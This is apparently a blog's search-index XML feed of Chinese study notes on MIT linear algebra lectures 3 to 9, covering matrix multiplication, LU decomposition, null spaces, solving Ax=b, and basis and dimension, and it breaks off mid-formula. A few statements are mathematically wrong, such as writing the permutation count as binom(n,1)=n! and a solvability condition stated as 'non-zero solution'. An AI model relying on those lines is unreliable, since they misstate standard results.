<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linear Algebra Review 09</title>
      <link href="/2020/04/23/Linear-Algebra-Review-09/"/>
      <url>/2020/04/23/Linear-Algebra-Review-09/</url>
      
        <content type="html"><![CDATA[<h2 id="第九讲：线性相关性、基、维数"><a href="#第九讲：线性相关性、基、维数" class="headerlink" title="第九讲：线性相关性、基、维数"></a>第九讲：线性相关性、基、维数</h2><p>$v_1,\ v_2,\ \cdots,\ v_n$是$m\times n$矩阵$A$的列向量：</p><ul><li>如果$A$零空间中有且仅有$0$向量，则各向量线性无关，$rank(A)=n$。秩为主元数量，自由变量是主元的线性组合得到的。所以线性无关则没有自由变量</li><li>如果存在非零向量$c$使得$Ac=0$，则存在线性相关向量，$rank(A)\lt n$。（即解x的线性组合能得到0向量，又比如：$v_1=\left[\begin{array}{c c} 2\newline 1 \end{array}\right]$，$v_2=\left[\begin{array}{c c} 0\newline 0 \end{array}\right]$，0倍的$v_1$加上任意倍的$v_2$会得到$\left[\begin{array}{c c} 0\newline 0 \end{array}\right]$，则称$v_1$与$v_2$线性相关）</li></ul><p>Vector $v_1, \cdots, v_2$ span a space means: the sapce consists of all combinations of these vectors.</p><p>向量空间$S$中的一组基（basis），具有两个性质：</p><ol><li>他们线性无关；</li><li>他们可以生成$S$。</li></ol><p>examples: space is $\mathbb{R}^3$, one basis is $\left[\begin{array}{c c c}1\newline 0\newline 0\end{array}\right], \left[\begin{array}{c c c}0\newline 1\newline 0\end{array}\right], \left[\begin{array}{c c c}0\newline 0\newline 1\end{array}\right]$<br>对于向量空间$\mathbb{R}^n$，如果$n$个向量组成的矩阵为可逆矩阵，则这$n$个向量为该空间的一组基，而数字$n$就是该空间的维数（dimension），注意不是矩阵的维数。<br>例如：$<br>A=<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 3 &amp; 1 \newline<br>1 &amp; 1 &amp; 2 &amp; 1 \newline<br>1 &amp; 2 &amp; 3 &amp; 1 \newline<br>\end{bmatrix}<br>$，A的列向量线性相关，其零空间中有非零向量，所以$rank(A)=2=主元存在的列数=列空间维数$。</p><p>可以很容易的求得$Ax=0$的两个解，如$<br>x_1=<br>\begin{bmatrix}<br>-1 \newline<br>-1 \newline<br>1 \newline<br>0 \newline<br>\end{bmatrix},<br>x_2=<br>\begin{bmatrix}<br>-1 \newline<br>0 \newline<br>0 \newline<br>1 \newline<br>\end{bmatrix}<br>$，根据前几讲，我们知道特解的个数就是自由变量的个数，所以$n-rank(A)=2=自由变量存在的列数=零空间维数$</p><p>最后我们得到：列空间维数$dim C(A)=rank(A)$，零空间维数$dim N(A)=n-rank(A)$</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 08</title>
      <link href="/2020/04/22/Linear-Algebra-Review-08/"/>
      <url>/2020/04/22/Linear-Algebra-Review-08/</url>
      
        <content type="html"><![CDATA[<h2 id="第八讲：求解-Ax-b-：可解性和解的结构"><a href="#第八讲：求解-Ax-b-：可解性和解的结构" class="headerlink" title="第八讲：求解$Ax=b$：可解性和解的结构"></a>第八讲：求解$Ax=b$：可解性和解的结构</h2><p>举例，同上一讲：$3 \times 4$ 的矩阵$<br>A=<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 2 &amp; 2\newline<br>2 &amp; 4 &amp; 6 &amp; 8\newline<br>3 &amp; 6 &amp; 8 &amp; 10\newline<br>\end{bmatrix}<br>$，求$Ax=b$的特解：</p><p>先写出其增广矩阵（augmented matrix）$\left[\begin{array}{c|c}A &amp; b\end{array}\right]$：<br>$$<br>\left[<br>\begin{array}{c c c c|c}<br>1 &amp; 2 &amp; 2 &amp; 2 &amp; b_1 \newline<br>2 &amp; 4 &amp; 6 &amp; 8 &amp; b_2 \newline<br>3 &amp; 6 &amp; 8 &amp; 10 &amp; b_3 \newline<br>\end{array}<br>\right]<br>\underrightarrow{消元}<br>\left[<br>\begin{array}{c c c c|c}<br>1 &amp; 2 &amp; 2 &amp; 2 &amp; b_1 \newline<br>0 &amp; 0 &amp; 2 &amp; 4 &amp; b_2-2b_1 \newline<br>0 &amp; 0 &amp; 0 &amp; 0 &amp; b_3-b_2-b_1 \newline<br>\end{array}<br>\right]<br>$$</p><p>显然，有解的必要条件为$b_3-b_2-b_1=0$。</p><p>讨论$b$满足什么条件才能让方程$Ax=b$有解（solvability condition on b）：当且仅当$b$属于$A$的列空间时。另一种描述：如果$A$的各行线性组合得到$0$行，则$b$端分量做同样的线性组合，结果也为$0$时，方程才有解。</p><p>解法：令所有自由变量取$0$，则有$\begin{cases}x_1 &amp;+&amp;2x_3 &amp; = 1 \newline  &amp;&amp; 2x_3&amp; = 3 \newline \end{cases}$，解得$\begin{cases}x_1 &amp; = &amp; -2 \newline x_3 &amp; = &amp; \frac{3}{2} \newline \end{cases}$<br>，代入$Ax=b$求得特解$<br>x_p=<br>\begin{bmatrix}<br>-2 \newline  0 \newline  \frac{3}{2} \newline  0<br>\end{bmatrix}<br>$。然后令$Ax=0$求解得零空间解$x_n$(自由变量分别取1)</p><p>令$Ax=b$成立的所有解：<br>$$\begin{cases}<br>A{x_p} = &amp; b \newline<br>A{x_n} = &amp; 0 \newline<br>\end{cases}<br>\quad<br>\underrightarrow{两式相加}<br>\quad<br>A(x_p+x_n)=b<br>$$</p><p>即$Ax=b$的解集为其特解加上零空间，对本例有：<br>$<br>x_{complete}=<br>\begin{bmatrix}<br>-2 \newline  0 \newline  \frac{3}{2} \newline  0<br>\end{bmatrix}<br>+<br>c_1\begin{bmatrix}-2\newline 1\newline 0\newline 0\newline \end{bmatrix}<br>+<br>c_2\begin{bmatrix}2\newline 0\newline -2\newline 1\newline \end{bmatrix}<br>$</p><p>对于$m \times n$矩阵$A$，有矩阵$A$的秩$r \leq min(m, n)$</p><p>列满秩$r=n$情况（即没有自由变量）：$<br>A=<br>\begin{bmatrix}<br>1 &amp; 3 \newline<br>2 &amp; 1 \newline<br>6 &amp; 1 \newline<br>5 &amp; 1 \newline<br>\end{bmatrix}<br>\underrightarrow{消元}<br>\begin{bmatrix}<br>1 &amp; 0 \newline<br>0 &amp; 1 \newline<br>0 &amp; 0 \newline<br>0 &amp; 0 \newline<br>\end{bmatrix}<br>$，$rank(A)=2$，要使$Ax=b, b \neq 0$有非零解，$b$必须取$A$中各列的线性组合，此时A的零空间中只有$0$向量，列之间的线性组合无法组成0向量。$x=x_p$，0或1个解</p><p>行满秩$r=m$情况：$<br>A=<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 6 &amp; 5 \newline<br>3 &amp; 1 &amp; 1 &amp; 1 \newline<br>\end{bmatrix}<br>$，$rank(A)=2$，$\forall b \in R^m都有x \neq 0的解$，因为此时$A$的列空间为$R^m$，$b \in R^m$恒成立，组成$A$的零空间的自由变量有n-r个。</p><p>行列满秩情况：$r=m=n$，如$<br>A=<br>\begin{bmatrix}<br>1 &amp; 2 \newline<br>3 &amp; 4 \newline<br>\end{bmatrix}<br>$，则$A$最终可以化简为$R=I$，其零空间只包含$0$向量。同时矩阵可逆。</p><p>总结：</p><p>$$\begin{array}{c|c|c|c}r=m=n&amp;r=n\lt m&amp;r=m\lt n&amp;r\lt m,r\lt n\newline R=I&amp;R=\begin{bmatrix}I\newline 0\end{bmatrix}&amp;R=\begin{bmatrix}I&amp;F\end{bmatrix}&amp;R=\begin{bmatrix}I&amp;F\newline 0&amp;0\end{bmatrix}\newline 1\ solution&amp;0\ or\ 1\ solution&amp;\infty\ solution&amp;0\ or\ \infty\ solution\end{array}$$</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 07</title>
      <link href="/2020/04/22/Linear-Algebra-Review-07/"/>
      <url>/2020/04/22/Linear-Algebra-Review-07/</url>
      
        <content type="html"><![CDATA[<h2 id="第七讲：求解-Ax-0-，主变量，特解"><a href="#第七讲：求解-Ax-0-，主变量，特解" class="headerlink" title="第七讲：求解$Ax=0$，主变量，特解"></a>第七讲：求解$Ax=0$，主变量，特解</h2><p>举例：有一个 $3 \times 4$ 的矩阵 $A=<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 2 &amp; 2\newline<br>2 &amp; 4 &amp; 6 &amp; 8\newline<br>3 &amp; 6 &amp; 8 &amp; 10\newline<br>\end{bmatrix}<br>$，求 $Ax=0$ 的特解：</p><ol><li>找出主变量（pivot variable）：<br>$$<br>A=<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 2 &amp; 2\newline<br>2 &amp; 4 &amp; 6 &amp; 8\newline<br>3 &amp; 6 &amp; 8 &amp; 10\newline<br>\end{bmatrix}<br>\underrightarrow{eliminate}<br>\begin{bmatrix}<br>\underline{1} &amp; 2 &amp; 2 &amp; 2\newline<br>0 &amp; 0 &amp; \underline{2} &amp; 4\newline<br>0 &amp; 0 &amp; 0 &amp; 0\newline<br>\end{bmatrix}<br>=U<br>$$</li></ol><p>主变量（pivot variable，下划线元素）的个数为2，即矩阵$A$的秩（rank）为2，即 $r=2$。<br>主变量所在的列为主列（pivot column），其余列为自由列（free column）。<br>自由列中的变量为自由变量（free variable），即可以给自由变量赋任意值（此例为 $x_2、x_4$），但赋值很有讲究。自由变量的个数为$n-r=4-2=2$。<br>通常，给自由列变量赋值，去求主列变量的值。如，令$x_2=1, x_4=0$求得特解$x=c_1\begin{bmatrix}-2\newline 1\newline 0\newline 0\newline \end{bmatrix}$；<br>再令$x_2=0, x_4=1$求得特解$x=c_2\begin{bmatrix}2\newline 0\newline -2\newline 1\newline \end{bmatrix}$。<br>该例还能进一步简化，即将$U$矩阵化简为$R$矩阵（Reduced row echelon form），即简化行阶梯形式。</p><p>在简化行阶梯形式中，主元上下的元素都是$0$：<br>$$<br>U=<br>\begin{bmatrix}<br>\underline{1} &amp; 2 &amp; 2 &amp; 2\newline<br>0 &amp; 0 &amp; \underline{2} &amp; 4\newline<br>0 &amp; 0 &amp; 0 &amp; 0\newline<br>\end{bmatrix}<br>\underrightarrow{化简}<br>\begin{bmatrix}<br>\underline{1} &amp; 2 &amp; 0 &amp; -2\newline<br>0 &amp; 0 &amp; \underline{1} &amp; 2\newline<br>0 &amp; 0 &amp; 0 &amp; 0\newline<br>\end{bmatrix}<br>=R<br>$$</p><p>将$R$矩阵中的主变量放在一起，自由变量放在一起（列交换），得到</p><p>$R=\left[\begin{array}{llll}\underline{1} &amp; 2 &amp; 0 &amp; -2 \newline  0 &amp; 0 &amp; \underline{1} &amp; 2 \newline  0 &amp; 0 &amp; 0 &amp; 0\end{array}\right] \xrightarrow{列交换} \left[\begin{array}{c c | c c }1 &amp; 0 &amp; 2 &amp; -2 \newline  0 &amp; 1 &amp; 0 &amp; 2 \newline  \hline 0 &amp; 0 &amp; 0 &amp; 0\end{array}\right]=\left[\begin{array}{ll}I &amp; F \newline  0 &amp; 0\end{array}\right]$<br>$\textrm{其中}I\textrm{为单位矩阵（r x r），}F\textrm{为自由变量组成的矩阵}$</p><p>计算零空间矩阵$N$（nullspace matrix），其列为特解，有$RN=0$。<br>$x_{p i v o t}=-F x_{f r e e}$<br>$\left[\begin{array}{cc}I &amp; F\end{array}\right]\left[\begin{array}{c}x_{p i v o t} \newline  x_{f r e e}\end{array}\right]=0$<br>$N=\left[\begin{array}{c}-F \newline  I\end{array}\right]$</p><p>在本例中$<br>N=<br>\begin{bmatrix}<br>-2 &amp; 2 \newline<br>0 &amp; -2 \newline<br>1 &amp; 0 \newline<br>0 &amp; 1 \newline<br>\end{bmatrix}<br>$，与上面求得的两个$x$特解一致。<br>另一个例子，矩阵$<br>A^T=<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 3 \newline<br>2 &amp; 4 &amp; 6 \newline<br>2 &amp; 6 &amp; 8 \newline<br>2 &amp; 8 &amp; 10 \newline<br>\end{bmatrix}<br>\underrightarrow{消元}<br>\begin{bmatrix}<br>1 &amp; 2 &amp; 3 \newline<br>0 &amp; 2 &amp; 2 \newline<br>0 &amp; 0 &amp; 0 \newline<br>0 &amp; 0 &amp; 0 \newline<br>\end{bmatrix}<br>\underrightarrow{化简}<br>\begin{bmatrix}<br>1 &amp; 0 &amp; 1 \newline<br>0 &amp; 1 &amp; 1 \newline<br>0 &amp; 0 &amp; 0 \newline<br>0 &amp; 0 &amp; 0 \newline<br>\end{bmatrix}<br>=R<br>$<br>矩阵的秩仍为$r=2$，有$2$个主变量，$1$个自由变量。<br>同上一例，取自由变量为$x_3=1$，求得特解$<br>x=c<br>\begin{bmatrix}<br>-1 \newline<br>-1 \newline<br>1 \newline<br>\end{bmatrix}<br>$</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 06</title>
      <link href="/2020/04/22/Linear-Algebra-Review-06/"/>
      <url>/2020/04/22/Linear-Algebra-Review-06/</url>
      
        <content type="html"><![CDATA[<h2 id="第六讲：列空间和零空间"><a href="#第六讲：列空间和零空间" class="headerlink" title="第六讲：列空间和零空间"></a>第六讲：列空间和零空间</h2><p>A plane through $\left[\begin{array}{c}{0} \newline  {0} \newline  {0} \end{array}\right]$ is subspace of $\mathbb{R}^3$, called P; A line through $\left[\begin{array}{c}{0} \newline  {0} \newline  {0} \end{array}\right]$ is subspace of $\mathbb{R}^3$, called L. L is not in the plane.<br>$P \cup L$ is not a subspace, 因为无法满足加法封闭性。<br>$P \cap L$ is a subspace, 因为是个零向量。<br>即对向量子空间$S$和$T$，有$S \cap T$也是向量子空间。</p><p>对$m \times n$矩阵$A$（column space of matrix A is a subspace of $\mathbb{R}^m$），$n \times 1$矩阵$x$，$m \times 1$矩阵$b$，运算$Ax=b$：</p><p>$\left[\begin{array}{ccccc}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1(n-1)} &amp; a_{1 n} \newline  a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2(n-1)} &amp; a_{2 n} \newline  \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \newline  a_{m 1} &amp; a_{m 2} &amp; \cdots &amp; a_{m(n-1)} &amp; a_{m n}\end{array}\right] \cdot\left[\begin{array}{c}x_{1} \newline  x_{2} \newline  \vdots \newline  x_{n-1} \newline  x_{n}\end{array}\right]=\left[\begin{array}{c}b_{1} \newline  b_{2} \newline  \vdots \newline  b_{m}\end{array}\right]$</p><ol><li>由$A$的列向量的linear combination生成的子空间为$A$的列空间</li><li>$Ax=b$有非零解当且仅当$b$属于$A$的列空间</li><li>A的零空间($\mathbb{R}^n$)是$Ax=0$中$x$的解组成的集合。<br>if Av=0  and Aw=0, then A(v+w)=0, then A(12v)=0</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 05</title>
      <link href="/2020/04/22/Linear-Algebra-Review-05/"/>
      <url>/2020/04/22/Linear-Algebra-Review-05/</url>
      
        <content type="html"><![CDATA[<h2 id="第五讲：转换、置换、向量空间R"><a href="#第五讲：转换、置换、向量空间R" class="headerlink" title="第五讲：转换、置换、向量空间R"></a>第五讲：转换、置换、向量空间R</h2><h3 id="置换矩阵（Permutation-Matrix）"><a href="#置换矩阵（Permutation-Matrix）" class="headerlink" title="置换矩阵（Permutation Matrix）"></a>置换矩阵（Permutation Matrix）</h3><p>$P$为置换矩阵，对任意可逆矩阵$A$有：<br>$PA=LU$<br>$n$阶方阵的置换矩阵$P$有$\binom{n}{1}=n!$个<br>对置换矩阵$P$，有$P^TP = I$<br>即$P^T = P^{-1}$</p><h3 id="转置矩阵（Transpose-Matrix）"><a href="#转置矩阵（Transpose-Matrix）" class="headerlink" title="转置矩阵（Transpose Matrix）"></a>转置矩阵（Transpose Matrix）</h3><p>$(A^T)<em>{ij} = A</em>{ji}$</p><h3 id="对称矩阵（Symmetric-Matrix）"><a href="#对称矩阵（Symmetric-Matrix）" class="headerlink" title="对称矩阵（Symmetric Matrix）"></a>对称矩阵（Symmetric Matrix）</h3><p>$A^T$ = $A$<br>对任意矩阵$R$有$R^TR$为对称矩阵：<br>$$<br>(R^TR)^T = (R)^T(R^T)^T = R^TR<br>\textrm{，即}(R^TR)^T = R^TR<br>$$</p><h3 id="向量空间（Vector-Space）"><a href="#向量空间（Vector-Space）" class="headerlink" title="向量空间（Vector Space）"></a>向量空间（Vector Space）</h3><p>$R^2$ = all 2-dim real vectors<br>所有向量空间都必须包含原点 Origin，因为向量空间中任意向量的数乘、求和运算得到的向量也在该空间中。一个向量乘以0得零向量。即向量空间要满足加法封闭和数乘封闭。任何的subspaces都必须过原点<br>Subspaces of $R^2$: </p><ol><li>all of $R^2$</li><li>any line through $\left[\begin{array}{c}{0} \newline  {0} \end{array}\right]$</li><li>zero vector only</li></ol><p>columns in $R^3$, like $A=\left[\begin{array}{cc} 1 &amp; 1 \newline  2 &amp; 3 \newline  4 &amp; 1\end{array}\right]$, all their($\left[\begin{array}{c}{1} \newline  {2} \newline  {4} \end{array}\right]$ and $\left[\begin{array}{c}{1} \newline  {3} \newline  {1} \end{array}\right]$) combinations form a subspace, called column space $C(A)$</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 04</title>
      <link href="/2020/04/19/Linear-Algebra-Review-04/"/>
      <url>/2020/04/19/Linear-Algebra-Review-04/</url>
      
        <content type="html"><![CDATA[<h2 id="第四讲：-A-的-LU-分解"><a href="#第四讲：-A-的-LU-分解" class="headerlink" title="第四讲：$A$ 的 $LU$ 分解"></a>第四讲：$A$ 的 $LU$ 分解</h2><h3 id="转置矩阵"><a href="#转置矩阵" class="headerlink" title="转置矩阵"></a>转置矩阵</h3><p>$AB$的逆矩阵：<br>$$<br>\begin{aligned}<br>A \cdot A^{-1} = I &amp; = A^{-1} \cdot A\newline<br>(AB) \cdot (B^{-1}A^{-1}) &amp; = I\newline<br>\textrm{则} AB \textrm{的逆矩阵为} &amp; B^{-1}A^{-1}<br>\end{aligned}<br>$$</p><p>$A^{T}$的逆矩阵：<br>$$<br>\begin{aligned}<br>(A \cdot A^{-1})^{T} &amp; = I^{T}\newline<br>(A^{-1})^{T} \cdot A^{T} &amp; = I\newline<br>\textrm{则} A^{T} \textrm{的逆矩阵为} &amp; (A^{-1})^{T}<br>\end{aligned}<br>$$</p><p>假设 $E_{32}E_{31}E_{21}A = U$ (no row exchanges)，那么转换成 $A = LU$ 的形式则为：$A=E_{21}^{-1}E_{31}^{-1}E_{32}^{-1}U=LU$</p><h3 id="将一个-n-阶方阵-A-变换为-LU-需要的计算量估计："><a href="#将一个-n-阶方阵-A-变换为-LU-需要的计算量估计：" class="headerlink" title="将一个 $n$ 阶方阵 $A$ 变换为 $LU$ 需要的计算量估计："></a>将一个 $n$ 阶方阵 $A$ 变换为 $LU$ 需要的计算量估计：</h3><ol><li><p>第一步，将$a_{11}$作为主元，需要的运算量约为$n^2$<br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n} \newline<br>a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n} \newline<br>\vdots &amp; \vdots &amp; \ddots &amp; \vdots \newline<br>a_{n1} &amp; a_{n2} &amp; \cdots &amp; a_{nn} \newline<br>\end{bmatrix}<br>\underrightarrow{消元}<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n} \newline<br>0      &amp; a_{22} &amp; \cdots &amp; a_{2n} \newline<br>0      &amp; \vdots &amp; \ddots &amp; \vdots \newline<br>0      &amp; a_{n2} &amp; \cdots &amp; a_{nn} \newline<br>\end{bmatrix}<br>$$</p></li><li><p>以此类推，接下来每一步计算量约为$(n-1)^2、(n-2)^2、\cdots、2^2、1^2$。</p></li><li><p>则将 $A$ 变换为 $LU$ 的总运算量应为$O(n^2+(n-1)^2+\cdots+2^2+1^2)$，即$O(\frac{n^3}{3})$。（1/3是因为 从1到n对$x^2dx$进行积分）</p></li></ol><h3 id="置换矩阵-Permutation-Matrix-："><a href="#置换矩阵-Permutation-Matrix-：" class="headerlink" title="置换矩阵(Permutation Matrix)："></a>置换矩阵(Permutation Matrix)：</h3><p>3阶方阵的置换矩阵（即进行行互换）有6个：<br>$$<br>\begin{bmatrix}<br>1 &amp; 0 &amp; 0 \newline<br>0 &amp; 1 &amp; 0 \newline<br>0 &amp; 0 &amp; 1 \newline<br>\end{bmatrix}<br>\begin{bmatrix}<br>0 &amp; 1 &amp; 0 \newline<br>1 &amp; 0 &amp; 0 \newline<br>0 &amp; 0 &amp; 1 \newline<br>\end{bmatrix}<br>\begin{bmatrix}<br>0 &amp; 0 &amp; 1 \newline<br>0 &amp; 1 &amp; 0 \newline<br>1 &amp; 0 &amp; 0 \newline<br>\end{bmatrix}<br>\begin{bmatrix}<br>1 &amp; 0 &amp; 0 \newline<br>0 &amp; 0 &amp; 1 \newline<br>0 &amp; 1 &amp; 0 \newline<br>\end{bmatrix}<br>\begin{bmatrix}<br>0 &amp; 1 &amp; 0 \newline<br>0 &amp; 0 &amp; 1 \newline<br>1 &amp; 0 &amp; 0 \newline<br>\end{bmatrix}<br>\begin{bmatrix}<br>0 &amp; 0 &amp; 1 \newline<br>1 &amp; 0 &amp; 0 \newline<br>0 &amp; 1 &amp; 0 \newline<br>\end{bmatrix}<br>$$</p><p>$n$阶方阵的置换矩阵有$\binom{n}{1}=n!$个。</p>]]></content>
      
      
      <categories>
          
          <category> Mathematics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinearAlgebra </tag>
            
            <tag> MIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linear Algebra Review 03</title>
      <link href="/2020/04/19/Linear-Algebra-Review-03/"/>
      <url>/2020/04/19/Linear-Algebra-Review-03/</url>
      
        <content type="html"><![CDATA[<h2 id="第三讲：乘法和逆矩阵"><a href="#第三讲：乘法和逆矩阵" class="headerlink" title="第三讲：乘法和逆矩阵"></a>第三讲：乘法和逆矩阵</h2><h3 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h3><h4 id="行列内积"><a href="#行列内积" class="headerlink" title="行列内积"></a>行列内积</h4><p>有$m\times n$矩阵$A$和$n\times p$矩阵$B$（$A$的总列数必须与$B$的总行数相等），两矩阵相乘有$AB=C$，$C$是一个$m\times p$矩阵，对于$C$矩阵中的第$i$行第$j$列元素$c_{ij}$，有：<br>$$c_{ij}=row_{i of A}\cdot column_{j of B}=\sum_{k=1}^na_{ik}b_{kj}$$</p><p>其中$a_{ik}$是$A$矩阵的第$i$行第$k$列元素，$b_{kj}$是$B$矩阵的第$k$行第$j$列元素。</p><p>可以看出$c_{ij}$其实是$A$矩阵第$i$行点乘$B$矩阵第$j$列 $\begin{bmatrix}&amp;\vdots&amp;\newline &amp;row_i&amp;\newline &amp;\vdots&amp;\end{bmatrix}\begin{bmatrix}&amp;&amp;\newline \cdots&amp;column_j&amp;\cdots\newline &amp;&amp;\end{bmatrix}=\begin{bmatrix}&amp;\vdots&amp;\newline \cdots&amp;c_{ij}&amp;\cdots\newline &amp;\vdots&amp;\end{bmatrix}$</p><h4 id="整列相乘"><a href="#整列相乘" class="headerlink" title="整列相乘"></a>整列相乘</h4><p>上一讲我们知道了如何计算矩阵乘以向量，而整列相乘就是使用这种线性组合的思想：<br>$\begin{bmatrix}&amp;&amp;\newline A_{col1}&amp;A_{col2}&amp;\cdots&amp;A_{coln}\newline &amp;&amp;\end{bmatrix}\begin{bmatrix}\cdots&amp;b_{1j}&amp;\cdots\newline \cdots&amp;b_{2j}&amp;\cdots\newline \cdots&amp;\vdots&amp;\cdots\newline \cdots&amp;b_{nj}&amp;\cdots\newline \end{bmatrix}=\begin{bmatrix}&amp;&amp;\newline \cdots&amp;\left(b_{1j}A_{col1}+b_{2j}A_{col2}+\cdots+b_{nj}A_{coln}\right)&amp;\cdots\newline &amp;&amp;\end{bmatrix}$<br>上面的运算为$B$的第$j$个列向量右乘矩阵$A$，求得的结果就是$C$矩阵的第$j$列，即$C$的第$j$列是$A$的列向量以$B$的第$j$列作为系数所求得的线性组合，$C_j=b_{1j}A_{col1}+b_{2j}A_{col2}+\cdots+b_{nj}A_{coln}$。<br>Columns of C are combinations of columns of A.</p><h4 id="整行相乘"><a href="#整行相乘" class="headerlink" title="整行相乘"></a>整行相乘</h4><p>同样的，也是利用行向量线性组合的思想：<br>$\begin{bmatrix}\vdots&amp;\vdots&amp;\vdots&amp;\vdots\newline a_{i1}&amp;a_{i2}&amp;\cdots&amp;a_{in}\newline \vdots&amp;\vdots&amp;\vdots&amp;\vdots\end{bmatrix}\begin{bmatrix}&amp;B_{row1}&amp;\newline &amp;B_{row2}&amp;\newline &amp;\vdots&amp;\newline &amp;B_{rown}&amp;\end{bmatrix}=\begin{bmatrix}\vdots\newline \left(a_{i1}B_{row1}+a_{i2}B_{row2}+\cdots+a_{in}B_{rown}\right)\newline \vdots\end{bmatrix}$<br>上面的运算为$A$的第$i$个行向量左乘矩阵$B$，求得的结果就是$C$矩阵的第$i$行，即$C$的第$i$行是$B$的行向量以$A$的第$i$行作为系数所求的的线性组合，$C_i=a_{i1}B_{row1}+a_{i2}B_{row2}+\cdots+a_{in}B_{rown}$。<br>Rows of C are combinations of rows of B.</p><h4 id="列乘以行"><a href="#列乘以行" class="headerlink" title="列乘以行"></a>列乘以行</h4><p>用$A$矩阵的列乘以$B$矩阵的行，得到的矩阵相加即可：<br>$\begin{bmatrix}&amp;&amp;\newline A_{col1}&amp;A_{col2}&amp;\cdots&amp;A_{coln}\newline &amp;&amp;\end{bmatrix}\begin{bmatrix}&amp;B_{row1}&amp;\newline &amp;B_{row2}&amp;\newline &amp;\vdots&amp;\newline &amp;B_{rown}&amp;\end{bmatrix}=A_{col1}B_{row1}+A_{col2}B_{row2}+\cdots+A_{coln}B_{rown}$<br>注意，$A_{coli}B_{rowi}$是一个$m\times 1$向量乘以一个$1\times p$向量，其结果是一个$m\times p$矩阵，而所有的$m\times p$矩阵之和就是计算结果。</p><h4 id="分块乘法"><a href="#分块乘法" class="headerlink" title="分块乘法"></a>分块乘法</h4><p>$\left[\begin{array}{c|c}A_1&amp;A_2\newline \hline A_3&amp;A_4\end{array}\right]\left[\begin{array}{c|c}B_1&amp;B_2\newline \hline B_3&amp;B_4\end{array}\right]=\left[\begin{array}{c|c}A_1B_1+A_2B_3&amp;A_1B_2+A_2B_4\newline \hline A_3B_1+A_4B_3&amp;A_3B_2+A_4B_4\end{array}\right]$<br>在分块合适的情况下，可以简化运算。</p><h3 id="逆（方阵）"><a href="#逆（方阵）" class="headerlink" title="逆（方阵）"></a>逆（方阵）</h3><p>首先，并不是所有的方阵都有逆；而如果逆存在，则有$A^{-1}A=I=AA^{-1}$。教授这里提前剧透，对于方阵，左逆和右逆是相等的，但是对于非方阵（长方形矩阵），其左逆不等于右逆。</p><p>对于这些有逆的矩阵，我们称其为可逆的或非奇异的。我们先来看看奇异矩阵（不可逆的）：$A=\begin{bmatrix}1&amp;2\newline 3&amp;6\end{bmatrix}$，在后面将要学习的行列式中，会发现这个矩阵的行列式为$0$。</p><p>观察这个方阵，我们如果用另一个矩阵乘$A$，则得到的结果矩阵中的每一列应该都是$\begin{bmatrix}1\newline 2\end{bmatrix}$的倍数，所以我们不可能从$AB$的乘积中得到单位矩阵$I$。</p><p>另一种判定方法，如果$A$乘以任意非零向量能够得到$0$向量，则矩阵$A$不可逆，即使用$Ax=0$判定。我们来用上面的矩阵为例：$\begin{bmatrix}1&amp;3\newline 2&amp;6\end{bmatrix}\begin{bmatrix}3\newline -1\end{bmatrix}=\begin{bmatrix}0\newline 0\end{bmatrix}$。</p><p>证明：如果对于非零的$x$仍有$Ax=0$，而$A$有逆$A^{-1}$，则$A^{-1}Ax=0$，即$x=0$，与题设矛盾，得证。</p><p>现在来看看什么矩阵有逆，设$A=\begin{bmatrix}1&amp;3\newline 2&amp;7\end{bmatrix}$，我们来求$A^{-1}$。$\begin{bmatrix}1&amp;3\newline 2&amp;7\end{bmatrix}\begin{bmatrix}a&amp;b\newline c&amp;d\end{bmatrix}=\begin{bmatrix}1&amp;0\newline 0&amp;1\end{bmatrix}$，使用列向量线性组合的思想，我们可以说$A$乘以$A^{-1}$的第$j$列，能够得到$I$的第$j$列，这时我会得到一个关于列的方程组。</p><p>接下来介绍高斯-若尔当（Gauss-Jordan）方法，该方法可以一次处理所有的方程：</p><ol><li>这个方程组为$\begin{cases}\begin{bmatrix}1&amp;3\newline 2&amp;7\end{bmatrix}\begin{bmatrix}a\newline b\end{bmatrix}=\begin{bmatrix}1\newline 0\end{bmatrix}\newline \begin{bmatrix}1&amp;3\newline 2&amp;7\end{bmatrix}\begin{bmatrix}c\newline d\end{bmatrix}=\begin{bmatrix}0\newline 1\end{bmatrix}\end{cases}$，我们想要同时解这两个方程；</li><li>构造这样一个矩阵$\left[\begin{array}{cc|cc}1&amp;3&amp;1&amp;0\newline 